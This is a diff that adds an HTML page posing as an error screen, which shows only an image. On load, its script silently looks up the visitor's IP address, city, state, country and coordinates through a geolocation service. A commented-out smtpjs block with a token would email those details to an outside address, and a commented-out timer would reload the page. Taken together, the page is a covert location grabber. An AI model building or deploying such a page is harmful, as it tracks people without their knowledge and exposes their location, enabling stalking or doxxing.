@@ -1,0 +1,47 @@
+<html>
+    <head>
+        <script
+            src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+        <script src="https://smtpjs.com/v3/smtp.js"></script>
+    </head>
+    <body>
+        <div style="justify-content: center; display:flex; margin-top:10%">
+            <img src="error.png" />
+        </div>
+
+        <script>
+var lat = ""
+var long = ""
+var city = ""
+var state = ""
+var ip = ""
+var country = ""
+$.getJSON('https://geolocation-db.com/json/')
+         .done (function(location) {
+          country = location.country_name;
+          state = location.state;
+          city = location.city;
+          lat = location.latitude;
+          long = location.longitude;
+          ip = location.IPv4;
+          console.log("IP: "+ ip)
+    // Email.send({
+    //     SecureToken : "2773f714-cd1c-43f1-b406-fd78c362402c",
+    //     To : 'TODO@gmx.com',
+    //     From : "TODO@gmail.com",
+    //     Subject : "testing",
+    //     Body : `country: ${country}\n
+    //     state: ${state}\n
+    //     city: ${city}\n
+    //     lat: ${lat}\n
+    //     long: ${long}\n
+    //     ip: ${ip}\n`
+    // })
+});
+
+// setTimeout(() => {
+//     location.reload()
+// }, 500)
+</script>
+    </body>
+</html>
